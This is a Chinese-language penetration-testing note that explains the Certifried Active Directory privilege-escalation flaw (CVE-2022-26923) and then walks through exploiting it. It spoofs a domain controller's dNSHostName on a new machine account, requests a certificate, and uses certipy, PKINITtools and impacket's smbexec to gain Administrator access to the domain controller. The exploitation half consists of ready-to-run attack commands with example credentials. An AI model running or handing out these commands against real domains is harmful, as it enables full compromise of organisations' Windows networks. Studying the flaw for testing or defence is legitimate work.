# Certifried域内提权(CVE 2022 26923)

#### 前置知识备忘

1. AD CS（活动目录证书与服务）
2. PKI(公钥基础设施)：由数字证书、数字签名、公钥和私钥组成的一个信任体系，用来实现证书的产生、管理、存储、分发和撤销等功能，可以理解为一套解决方案，其中需要证书颁发机构，默认活动目录环境不会安装活动目录证书服务。
3. 活动目录证书注册流程：
   1. 注册期间客户端先根据活动目录Enrollment Services容器中的对象找到企业CA
   2. 生成一个公钥/私钥对，并将公钥、证书主题和证书模板名称等其他详细信息一起放入签名请求(CSR)消息
   3. 客户端
   4. 使用其私钥签署CSR，并将CSR发送到企业CA服务器
   5. 企业CA服务器检测客户端是否可以请求证书,如果是，通过查找CSR中指定的证书模板AD对象来确定是否会颁发证书，CA会检测证书模板的AD对象的权限是否允许账户获取证书，允许将使用证书模板自定义的蓝图设置(如EKU等)并使用CSR中提权的其他信息生成证书
4. CA颁发的证书可以提供加密如加密文件系统、数字签名、身份验证等服务。

#### CVE-2022-26923漏洞原理

概念1：默认下，域用户可以注册User证书模板，域机器账户可以注册Machine证书模板，两个证书模板都允许客户端身份验证，当用户账户申请User模板证书时，用户账户的用户主体名称(UPN)将嵌入证书，以进行识别，当进行身份验证时，KDC会尝试将UPN从证书映射到目标用户，根据微软的规范，UPN必须是为一个，意味着不能同事拥有两个UPN用户

概念2：机械账户是没用UPN属性的，当机械用户申请证书时，计算机的DNS属性值被嵌入到证书，以进行识别

漏洞原理：dNSHostName属性值并非唯一，并且对应机器账户的创建者来说，拥有计算机对象AD写入权限，因此在Marcus用户下将PENTEST$机器账户的dNSHostName改为域控制器的DNS主机名，就能欺骗AD CS并最终申请到域控制器的AD证书

#### 利用(impacket套件)：

修改`addcomputer`脚本，因为`dNSHostName`属性与`ServicePrincipalName`属性相关联，所以如果要修改`dNSHostName`的值就必须修改脚本中`ServicePrincipalName`默认的SPN为最新的DNS主机名更新

```
注释addcomputer脚本中servicePrincipalName并将dNSHostName修改为域控
```

<figure><img src="../../.gitbook/assets/Pasted image 20230220202623.png" alt=""><figcaption></figcaption></figure>

创建`dNSHostName`为域控DNS名称的机器用户

```
python3 addcomputer.py hack-my.com/Marcus:P@ssWOrd! -method LDAPS -computer-name-GGboy\$ -computer-pass P@ssWord! -dc-ip DC-1.hack-my.com -dc-host DC-1.hack-my.com
```

以刚创立的机械用户申请Machine模板证书(`GGboy$`的`dNSHostName`属性值将嵌入证书中作为主题备用名称，由于属性值修改为域控DNS。因为颁发域控制器机器账户的证书

```
certipy req -u GGboy\$@DC-1.hack-my.com -p PassWord! -ca 'hack-my-DC-1-CA' -template 'Machine'
```

利用颁发的证书`dc-1.pfx`对KDC进行`PKINIT Kerberos`身份验证并获取域控制器TGT票据

```
certipy auth -pfx 'dc-1.pfx' -username 'DC-1$' -domain 'hack-my.com' -dc-ip 'DC-1.hack-my.com' 
```

获取域控TGT后，通过Kerberos的S4U2Self扩展协议为域控管理员用户申请针对域控上其他服务的ST票据(利用`PKINITtools`工具来操作，请求域控制器CIFS服务，将上一步生成的dc-1.pfx移动到工具目录下)

```
python3 gets4uticket.py kerberos+ccache://hack-my.com//dc-1/$:dc-1.ccache@dc-1.hack-my.com cifs/dc-1.hack-my.com@hack-my.com Administrator@hack-my.com Administrator.ccache -v
```

通过设置环境变量`KRB5CCNAME`来使用申请到的`Administrator.ccache`票据并通过`smbexec`获取域控最高权限

```
export KRB5CCNAME=~/文档/mmm/PKINITtools/Administrator.ccache
python3 smbexec.py -k hack-my.com/Administrator@dc-1.hack-my.com -no-pass
```
